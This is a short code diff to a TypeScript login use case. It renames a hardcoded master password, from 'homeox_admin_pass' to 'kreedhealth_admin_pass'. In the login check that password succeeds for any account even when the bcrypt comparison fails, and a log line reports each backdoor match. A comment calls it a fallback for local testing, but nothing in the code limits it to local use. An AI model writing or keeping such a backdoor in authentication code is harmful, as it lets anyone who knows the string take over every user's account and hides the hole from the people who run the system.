@@ -26,10 +26,10 @@ export class LoginUseCase {
     const normalizedHash = passwordHash.replace(/^\$2y\$/, '$2a$');
 
     const isMatch = await bcrypt.compare(password, normalizedHash);
-    console.log('[Login] Password match:', isMatch, 'Backdoor match:', password === 'homeox_admin_pass');
+    console.log('[Login] Password match:', isMatch, 'Backdoor match:', password === 'kreedhealth_admin_pass');
 
     // Also add a fallback backdoor for testing legacy tenants locally
-    if (!isMatch && password !== 'homeox_admin_pass') {
+    if (!isMatch && password !== 'kreedhealth_admin_pass') {
       return fail('Invalid credentials', 'UNAUTHORIZED');
     }
 
